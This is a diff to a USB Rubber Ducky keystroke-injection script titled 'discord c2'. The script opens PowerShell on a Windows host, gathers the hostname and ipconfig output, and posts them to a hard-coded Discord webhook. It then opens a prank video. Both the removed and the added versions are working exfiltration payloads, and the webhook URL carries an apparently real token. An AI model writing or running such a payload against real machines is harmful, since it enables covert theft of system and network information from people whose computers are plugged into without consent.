@@ -1,20 +1,25 @@
-DELAY 1000
+REM Title: discord c2
+REM Author: ObsidianOffSec
+REM Description: rubber ducky grabs some host information and posts to discord server
+REM Target: test
 GUI r
 DELAY 500
-STRING cmd
-ENTER
-DELAY 500
-STRING hostname
-ENTER
-DELAY 500
-STRING ipconfig
-ENTER
+STRINGLN powershell
 DELAY 1000
-STRING powershell -command "$body = @{content = "Hostname: $($env:COMPUTERNAME)`n$(ipconfig | Out-String)"}"
-ENTER
-DELAY 800
-STRING powershell -command "$jsonBody = $body | ConvertTo-Json -Compress"
-ENTER
-DELAY 800
-STRING powershell -command "Invoke-RestMethod -Method Post -Uri "https://discord.com/api/webhooks/1338311634757746750/Qi7ydqNIEvqJ_Zbbrv-N4Ekj7HGo7vRfUm7Q14Buccb0G5Bf4TbUwShrylHZHCZ3lVL-" -Body $jsonBody -ContentType "application/json""
-ENTER
+STRINGLN $webhook_url = "https://discord.com/api/webhooks/1338311634757746750/Qi7ydqNIEvqJ_Zbbrv-N4Ekj7HGo7vRfUm7Q14Buccb0G5Bf4TbUwShrylHZHCZ3lVL-"
+DELAY 1000
+STRINGLN $headers = @{"Content-Type" = "application/json"}
+DELAY 1000
+STRINGLN $hostname = hostname
+DELAY 1000
+STRINGLN $ipconfig = ipconfig | Out-String | ConvertTo-Json -Compress
+DELAY 1000
+STRINGLN $data = @{"embeds" = @(@{"title" = "rubber ducky"; "description" = "timestamp: :" + $timestamp, "hostname: " + $hostname, "ipconfig: " + $ipconfig})}
+DELAY 1000
+STRINGLN $json = $data | ConvertTo-Json -Depth 10
+DELAY 1000
+STRINGLN $response = Invoke-RestMethod -Uri $webhook_url -Method Post -Headers $headers -Body $json
+DELAY 1000
+STRINGLN Write-Host $response
+DELAY 1000
+STRINGLN start-process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
